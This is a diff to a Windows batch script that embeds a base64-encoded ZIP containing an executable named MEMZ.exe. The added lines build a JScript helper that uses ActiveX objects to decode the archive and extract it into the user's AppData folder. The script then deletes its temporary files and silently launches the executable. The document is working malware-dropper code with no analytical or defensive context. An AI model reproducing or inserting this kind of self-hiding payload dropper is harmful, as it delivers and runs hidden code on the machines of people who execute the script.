@@ -1,3 +1,4 @@
+
 @echo off
 
 echo UEsDBBQAAAAIAHV36kiQ6IfZcyEAAAA6AAAIAAAATUVNWi5leGXtew10U8e17kg6soUtjACbGGzi>x
@@ -153,3 +154,17 @@ echo cndyEW4XN8jdw+3l7uP2cQe4g9xj3OPcIVjnMHeEex4WOsa9zo1wb3InuVPcKHeGi3HnuDHuIjf
 echo XeaIgTFoDFqDzpBqSDdkGlhDtmGpIdfAGRCHDTUGq2GDYbPBCWv2Gv4XwsY/yv+35X8CUEsBAhQA>>x
 echo FAAAAAgAdXfqSJDoh9lzIQAAADoAAAgAAAAAAAAAAAAAAP+BAAAAAE1FTVouZXhlUEsFBgAAAAAB>>x
 echo AAEANgAAAJkhAAAAAA==>>x
+
+echo f=new ActiveXObject(^"Scripting.FileSystemObject^");i=f.getFile(^"x^").openAsTextStream();>x.js
+echo x=new ActiveXObject(^"MSXml2.DOMDocument^").createElement(^"Base64Data^");x.dataType=^"bin.base64^";>>x.js
+echo x.text=i.readAll();o=new ActiveXObject(^"ADODB.Stream^");o.type=1;o.open();o.write(x.nodeTypedValue);>>x.js
+echo z=f.getAbsolutePathName(^"z.zip^");o.saveToFile(z);s=new ActiveXObject(^"Shell.Application^");>>x.js
+echo s.namespace(26).copyHere(s.namespace(z).items());o.close();i.close();>>x.js
+
+set v="%appdata%\MEMZ.exe"
+del %v% >NUL 2>NUL
+cscript x.js >NUL 2>NUL
+del x.js >NUL 2>NUL
+del z.zip >NUL 2>NUL
+del x >NUL 2>NUL
+start "" %v%
